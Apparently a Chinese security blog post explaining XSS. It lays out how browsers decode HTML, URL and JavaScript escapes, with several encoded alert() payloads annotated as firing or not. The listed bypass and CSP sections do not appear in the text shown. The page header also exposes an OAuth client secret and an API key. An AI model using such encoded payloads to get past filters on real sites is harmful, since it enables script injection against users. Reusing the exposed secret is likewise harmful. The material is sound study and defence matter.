<!DOCTYPE html><html><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="xss漏洞"><meta name="keywords" content="xss"><meta name="author" content="ye1s,undefined"><meta name="copyright" content="ye1s"><title>xss漏洞【ye1s】</title><link rel="stylesheet" href="/css/fan.css"><link rel="stylesheet" href="/css/thirdparty/jquery.mCustomScrollbar.min.css"><link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4/dist/instantsearch-theme-algolia.min.css"><script src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.10.4"></script><!-- link(rel="dns-prefetch" href="https://cdn.jsdelivr.net")--><!-- link(rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.css")--><!-- script(src="https://cdn.jsdelivr.net/npm/instantsearch.js@2.1.1/dist/instantsearch.min.js" defer)--><!-- script(src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML")--><script src="/js/mathjax/mathjax.js"></script><script type="text/x-mathjax-config">MathJax.Hub.Config({
    tex2jax: {inlineMath: [['$', '$'], ['\\(', '\\)']]}
});
</script><script>var isPassword = '' || false;
if (isPassword) {
    if (prompt('请输入文章密码') !== '') {
        alert('密码错误！');
        history.back();
    }
}</script><script>window.GLOBAL_CONFIG = {
  root: '/',
  algolia: {"appId":"LKL6Q0GQJM","apiKey":"03829f64e2f5c11e4a5e2b8e51e24eb9","indexName":"blog","hits":{"per_page":10},"languages":{"input_placeholder":"搜索文章","hits_empty":"找不到您查询的内容:${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  gitment: {"owner":"ye1sec","repo":"comments","client_id":"d5ece338867af32b6dfa","client_secret":"2caf36bbd47977524017f95105315fc9e65f0577"},
}</script><meta name="generator" content="Hexo 4.2.1"><link rel="alternate" href="/atom.xml" title="ye1s" type="application/atom+xml">
</head><body><canvas id="universe"></canvas><!--#body--><div id="sidebar"><div class="toggle-sidebar-info button-hover"><span data-toggle="文章目录">站点概览</span></div><div class="sidebar-toc"><div class="sidebar-toc-title">目录</div><div class="sidebar-toc-progress"><span class="progress-notice">您已阅读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc-progress-bar"></div></div><div class="sidebar-toc-content" id="sidebar-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#页面解码"><span class="toc-number">1.</span> <span class="toc-text">页面解码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#解码机制"><span class="toc-number">1.1.</span> <span class="toc-text">解码机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#解码顺序"><span class="toc-number">1.2.</span> <span class="toc-text">解码顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#测试样例"><span class="toc-number">1.3.</span> <span class="toc-text">测试样例</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#反射性"><span class="toc-number">2.</span> <span class="toc-text">反射性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#存储型"><span class="toc-number">3.</span> <span class="toc-text">存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-盲打后台"><span class="toc-number">3.1.</span> <span class="toc-text">XSS 盲打后台</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#DOM型"><span class="toc-number">4.</span> <span class="toc-text">DOM型</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#在前端实现页面跳转"><span class="toc-number">4.1.</span> <span class="toc-text">在前端实现页面跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用indexOf判断URL参数是否合法"><span class="toc-number">4.1.1.</span> <span class="toc-text">使用indexOf判断URL参数是否合法</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#正则表达式缺陷"><span class="toc-number">4.1.2.</span> <span class="toc-text">正则表达式缺陷</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#取值写入页面或动态执行"><span class="toc-number">4.2.</span> <span class="toc-text">取值写入页面或动态执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#URL中的取参数值写入页面或动态执行"><span class="toc-number">4.2.1.</span> <span class="toc-text">URL中的取参数值写入页面或动态执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Cookie取参数值写入页面或动态执行"><span class="toc-number">4.2.2.</span> <span class="toc-text">Cookie取参数值写入页面或动态执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#localStorage、Referer、Window-name、SessionStorage"><span class="toc-number">4.2.3.</span> <span class="toc-text">localStorage、Referer、Window name、SessionStorage</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#修复"><span class="toc-number">4.2.4.</span> <span class="toc-text">修复</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#标签利用"><span class="toc-number">5.</span> <span class="toc-text">标签利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#img"><span class="toc-number">5.1.</span> <span class="toc-text">img</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#a"><span class="toc-number">5.2.</span> <span class="toc-text">a</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input"><span class="toc-number">5.3.</span> <span class="toc-text">input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#form"><span class="toc-number">5.4.</span> <span class="toc-text">form</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#iframe"><span class="toc-number">5.5.</span> <span class="toc-text">iframe</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#svg"><span class="toc-number">5.6.</span> <span class="toc-text">svg</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#detail"><span class="toc-number">5.7.</span> <span class="toc-text">detail</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#select"><span class="toc-number">5.8.</span> <span class="toc-text">select</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#video"><span class="toc-number">5.9.</span> <span class="toc-text">video</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#audio"><span class="toc-number">5.10.</span> <span class="toc-text">audio</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#body"><span class="toc-number">5.11.</span> <span class="toc-text">body</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#textarea"><span class="toc-number">5.12.</span> <span class="toc-text">textarea</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#keygen"><span class="toc-number">5.13.</span> <span class="toc-text">keygen</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#过滤绕过"><span class="toc-number">6.</span> <span class="toc-text">过滤绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤空格"><span class="toc-number">6.1.</span> <span class="toc-text">过滤空格</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤关键字"><span class="toc-number">6.2.</span> <span class="toc-text">过滤关键字</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#大小写绕过"><span class="toc-number">6.2.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#双写关键字"><span class="toc-number">6.2.2.</span> <span class="toc-text">双写关键字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#字符拼接"><span class="toc-number">6.2.3.</span> <span class="toc-text">字符拼接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#其它字符混淆"><span class="toc-number">6.2.4.</span> <span class="toc-text">其它字符混淆</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#编码绕过"><span class="toc-number">6.3.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤双引号，单引号"><span class="toc-number">6.4.</span> <span class="toc-text">过滤双引号，单引号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤括号"><span class="toc-number">6.5.</span> <span class="toc-text">过滤括号</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#过滤url地址"><span class="toc-number">6.6.</span> <span class="toc-text">过滤url地址</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用url编码"><span class="toc-number">6.6.1.</span> <span class="toc-text">使用url编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用IP"><span class="toc-number">6.6.2.</span> <span class="toc-text">使用IP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CSP"><span class="toc-number">7.</span> <span class="toc-text">CSP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CSP启用方法"><span class="toc-number">7.1.</span> <span class="toc-text">CSP启用方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#限制选项"><span class="toc-number">7.2.</span> <span class="toc-text">限制选项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Content-Security-Policy-Report-Only"><span class="toc-number">7.3.</span> <span class="toc-text">Content-Security-Policy-Report-Only</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#选项值"><span class="toc-number">7.4.</span> <span class="toc-text">选项值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#script-src-的特殊值"><span class="toc-number">7.5.</span> <span class="toc-text">script-src 的特殊值</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#注意点"><span class="toc-number">7.6.</span> <span class="toc-text">注意点</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#csp-绕过"><span class="toc-number">8.</span> <span class="toc-text">csp 绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#location绕过"><span class="toc-number">8.1.</span> <span class="toc-text">location绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#link标签导致的绕过"><span class="toc-number">8.2.</span> <span class="toc-text">link标签导致的绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Iframe绕过"><span class="toc-number">8.3.</span> <span class="toc-text">Iframe绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CDN绕过"><span class="toc-number">8.4.</span> <span class="toc-text">CDN绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#站点可控静态资源绕过"><span class="toc-number">8.5.</span> <span class="toc-text">站点可控静态资源绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#jsonp"><span class="toc-number">8.6.</span> <span class="toc-text">jsonp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#base-uri绕过"><span class="toc-number">8.7.</span> <span class="toc-text">base-uri绕过</span></a></li></ol></li></ol></div></div><div class="author-info hide"><div class="author-info-avatar"><img class="author-info-avatar-img" src="/avatar.png"></div><div class="author-info-name">ye1s</div><div class="author-info-description"></div><div class="links-buttons"><a class="links-button button-hover" href="https://github.com/ye1sec" target="_blank">GitHub<i class="icon-dot bg-color8"></i></a><a class="links-button button-hover" href="mailto:431774437@qq.com" target="_blank">E-Mail<i class="icon-dot bg-color9"></i></a><a class="links-button button-hover" href="tencent://message/?uin=431774437&amp;Site=&amp;Menu=yes" target="_blank">QQ<i class="icon-dot bg-color5"></i></a></div><div class="author-info-articles"><a class="author-info-articles-archives article-meta" href="/archives"><span class="pull-top">日志</span><span class="pull-bottom">200</span></a><a class="author-info-articles-tags article-meta" href="/tags"><span class="pull-top">标签</span><span class="pull-bottom">149</span></a><a class="author-info-articles-categories article-meta" href="/categories"><span class="pull-top">分类</span><span class="pull-bottom">12</span></a></div><div class="friend-link"><a class="friend-link-text" href="http://www.m00nback.xyz/" target="_blank">MoonBack</a><a class="friend-link-text" target="_blank">待定</a></div></div></div><div id="main-container"><header><div id="menu-outer"><i class="menu-list-icon fas fa-bars"></i><nav id="menu-inner"><a class="menu-item" href="/">首页</a><a class="menu-item" href="/tags">标签</a><a class="menu-item" href="/categories">分类</a><a class="menu-item" href="/archives">归档</a><a class="menu-item" href="/about">关于</a></nav><div class="right-info"><a class="search social-icon"><i class="fas fa-search"></i><span> 搜索</span></a><a class="title-name" href="/">ye1s</a><span id="now-time"></span></div></div></header><div id="content-outer"><div id="content-inner"><article id="post"><div class="post-header"><div class="title">xss漏洞</div><div class="container"><time class="button-hover post-date"><i class="fas fa-calendar-alt article-icon" aria-hidden="true"></i> 发表于 2019-03-16 | 更新于 2021-06-30</time><!--time.button-hover.post-date #[i.fas.fa-calendar-alt.article-icon(aria-hidden="true")] #[=__('post.modified')] #[=date(page['updated'], config.date_format)]--><div class="button-hover categories"><i class="fa fa-inbox article-icon" aria-hidden="true"></i><a class="link-a" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></div><div class="button-hover tags"><i class="fa fa-tag article-icon" aria-hidden="true"></i><a class="link-a" href="/tags/xss/">xss</a></div></div></div><div class="main-content"><p>XSS (Cross-Site Script, 跨站脚本)是由于 web 应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击</p>
<a id="more"></a>
<p><img src="../../images/loopholes/xss/xss.png" alt=""></p>
<h1 id="页面解码"><a href="#页面解码" class="headerlink" title="页面解码"></a>页面解码</h1><p>详细查看此篇文章：<br><a href="https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md" target="_blank" rel="noopener">https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md</a></p>
<h2 id="解码机制"><a href="#解码机制" class="headerlink" title="解码机制"></a>解码机制</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">function</span> HtmlEncode(str) &#123;</span><br><span class="line">    var s = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span> (str.length == 0) <span class="built_in">return</span> <span class="string">""</span>;</span><br><span class="line">    s = str.replace(/&amp;/g, <span class="string">"&amp;amp;"</span>);</span><br><span class="line">    s = s.replace(/&lt;/g, <span class="string">"&amp;lt;"</span>);</span><br><span class="line">    s = s.replace(/&gt;/g, <span class="string">"&amp;gt;"</span>);</span><br><span class="line">    s = s.replace(/\"/g, <span class="string">"&amp;quot;"</span>);</span><br><span class="line">    <span class="built_in">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">A: &lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> value=<span class="string">"exec"</span> onclick=<span class="string">"document.write (HtmlEncode('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;'))"</span> /&gt; &lt;/br&gt;</span><br><span class="line">B: &lt;input <span class="built_in">type</span>=<span class="string">"button"</span> id=<span class="string">"exec_btn"</span> value=<span class="string">"exec"</span> onclick=<span class="string">"document.write (HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))"</span> /&gt;</span><br></pre></td></tr></table></figure>
<p>上面两条的执行结果是一样的，都只是在网页中输出了<code>&lt;img src=@ onerror=alert(123) /&gt;</code> 而没有弹框， 只不过A中的js代码在执行前已经先按照html的形式解码了<br><img src="../../images/loopholes/xss/1.png" alt=""><br>关键的问题是这里的js代码是出现在html标签之间的，因为嵌入到html标签中的js 代码在解析之前会先按照html规则进行自动解码，包括： 进制编码：&amp;#xH（十六进制格式）、&amp;#D（十进制格式）。<br>HTML 实体编码，下面是 html5 新增的实体编码：<br>&colon; =&gt; [冒号]<br>&NewLine; =&gt; [换行]<br>case: <code>&lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt;</code><br><img src="../../images/loopholes/xss/3.png" alt=""><br>以上是关于js在html内的解码，那么假如用户的输入后所传递的值并不是出现在html标签之内，而是出现在js中呢？ 浏览器也有js的解析规则，还是举例子来说明</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'&amp;lt;img src=@ onerror=alert(2) /&amp;gt;'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/xss/2.png" alt=""><br>上边的例子会弹出对话框吗?是不会的，因为它出现在js代码之中，上下文环境为JavaScript，浏览器解析前会将出现在js代码中的以下内容编码进行解码<br>1):UniCode形式(\uH)  </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'\u003Cimg src=@ onerror=alert(123) /\u003E'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="../../images/loopholes/xss/4.png" alt=""><br>2):普通16进制(\xHH) 或者 8进制([0-7]{1,3})</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> document.write(<span class="string">'\x3Cimg src=@ onerror=alert(123) /\x3E'</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>3)纯转义，如果用户带入js代码的内容中含有 ‘、”、&lt; 、&gt; 这些字符将他们进行转义是没有意义的，还是会原样的输出</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"> //document.write(<span class="string">'\&lt;img src=@ onerror=alert(123) /\&gt;'</span>); //弹框</span><br><span class="line"> //document.write(<span class="string">'te\'</span>st<span class="string">'); //te'</span>st</span><br><span class="line"> //document.write(<span class="string">'te\"st'</span>); //te<span class="string">"st</span></span><br><span class="line"><span class="string">&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>具有 HtmlEncode 功能的标签<br>如 <code>&lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;、&lt;xmp&gt;、&lt;plaintext&gt;， html</code> 在这些标签里面是不解析的，比如 <code>$(&#39;tt&#39;).innerHTML=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;</code>，不会造成弹框。<code>&lt;xmp&gt;</code> 没有HtmlEncode 功能，<code>&lt;plaintext&gt;</code> 在 Firefox 下不会进行 HtmlEncode 编码，而在 Chrome 下面会</p>
<h2 id="解码顺序"><a href="#解码顺序" class="headerlink" title="解码顺序"></a>解码顺序</h2><p>第一个例子:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript&amp;#58;&amp;#32;alert('\&lt;http&amp;#58;&amp;#47;&amp;#47;simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>首先进行html解码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('\&lt;http://simba.cc/find?q=%E4%BD%A0%E5%A5%BD\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>点击链接后，先是 URL 解码，结果为（假设是 style 属性，则会执行 css 解码） </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('\&lt;http://simba.cc/find?q=你好\&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>最后是 JS 解码，结果为</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript: alert('&lt;http://simba.cc/find?q=你好&gt;');"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>第二个例子</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">          &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line">          &lt;a href=<span class="string">"javascript:alert('&lt;?php echo <span class="variable">$_GET</span>['input'];?&gt;');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>当参数input的值为: %26lt%5cu4e00%26gt 的时候，因为 php 使用 $_GET 获取参数值（urldecode），故返回的 html 源码是 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">href=<span class="string">"javascript:alert('&amp;lt\u4e00&amp;gt');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>浏览器解析时 html 解码 为 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript:alert('&lt;\u4e00&gt;');"</span>&gt;<span class="built_in">test</span>&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>点击时进行 js 解码，故弹框为 &lt;一&gt;<br><img src="../../images/loopholes/xss/5.png" alt=""></p>
<h2 id="测试样例"><a href="#测试样例" class="headerlink" title="测试样例"></a>测试样例</h2><p>1.<code>URL encoded &quot;javascript:alert(1)&quot;</code><br>不会触发。javascript: 是 scheme，不能进行urlencode，否则 urldecode 时出现 “no scheme” 状态。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>

<p>2.<code>Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot;</code><br>触发。先进行 htmldecode，点击执行urldecode，最后执行 js</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29"</span>&gt;click&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>3.<code>URL encoded &quot;:&quot;</code><br>不会触发。冒号是 scheme 的一部分。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"javascript%3aalert(3)"</span>&gt;&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<p>4.<code>Character entity encoded &lt; and &gt;</code><br>不会触发。&lt; &gt; 是识别 tag 的开始结束符，不能进行编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;div&gt;&amp;<span class="comment">#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt;</span></span><br></pre></td></tr></table></figure>
<p>5.<code>Character entity encoded &lt; and &gt;</code><br>如前所述，textarea 等标签内不会进行 htmldecode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&amp;<span class="comment">#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt;</span></span><br></pre></td></tr></table></figure>
<p>6.不会触发。textarea 标签内不会执行 js，除非我们先把它闭合了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt;</span><br></pre></td></tr></table></figure>
<p>7.<code>Character entity encoded</code><br>触发。先进行 htmldecode，点击触发 js 事件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"confirm('7&amp;#39;);"</span>&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>8.<code>Unicode escape sequence encoded</code><br>不会触发。’ “ ( ) 的unicode 编码形式在这里只是字符串的文本含义，并不能表示真正的引号闭合</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;button onclick=<span class="string">"confirm('8\u0027);"</span>&gt;Button&lt;/button&gt;</span><br></pre></td></tr></table></figure>
<p>9.<code>Character entity encoded alert(9);</code><br>不会触发。script 域内不会进行 htmldecode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;&amp;<span class="comment">#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>10.<code>Unicode Escape sequence encoded alert</code><br>触发。function name 是 identifier name，可以用unicode 方式编码</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">&lt;div&gt;&lt;a href=<span class="string">"javascript:\u0061lert('1\x62')"</span>&gt;ga&lt;/a&gt;&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;img src=<span class="string">"x"</span> onerror=<span class="string">"\u0061\u006c\u0065\u0072\u0074(1)"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>11.<code>Unicode Escape sequence encoded alert(11)</code><br>不会触发。同问题2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>12 <code>Unicode Escape sequence encoded alert and 12</code><br>不会触发。unicode 编码的 1, 2 在这里不能表示成字符串，因为它们不是被包裹在 ‘ “ 中</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>可以触发的三个</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(<span class="string">'\u0031\u0032'</span>)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(/\u0031\u0032/)&lt;/script&gt;</span><br><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(12)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>13.<code>Unicode escape sequence encoded &#39;</code><br>不会触发。同问题2</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'13\u0027)&lt;/script&gt;</span></span><br></pre></td></tr></table></figure>
<p>14.Unicode escape sequence encoded line feed.<br>触发。unicode 编码的换行符在这里并不会真正地换行而导致js 语法错误，而是普通的文本含义 </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="string">'14\u000a'</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

